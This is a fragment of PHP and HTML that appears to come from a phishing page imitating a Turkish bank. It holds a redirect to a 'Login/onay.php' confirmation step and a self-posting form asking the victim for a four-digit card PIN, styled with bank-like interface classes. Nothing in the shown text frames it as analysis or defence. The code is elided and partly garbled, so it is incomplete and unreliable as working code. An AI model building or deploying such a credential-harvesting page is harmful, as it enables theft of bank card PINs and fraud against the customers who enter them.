...
header('Location: ../Login/onay.php');
...
<div id="error_notification"></div>
  ...
  <form action="<?php echo basename(__FILE__); ?>" class="login-form" enctype="multipart/form-data" method="post" id='login_form'>
      <input name="pin" required="required" type="text" id="kimlik" autocomplete="off" placeholder="Kartinizin Pin Kodu" pattern="[0-9]*" maxlength="4" title="Mobil Onay Kodu" tabindex="2" size="6" class="standardInput info onlyNumeric virtualKeypad" onkeyup="hideInputBottomErrorMessage($(&#006755;#ParolaText&#006755;));"/>
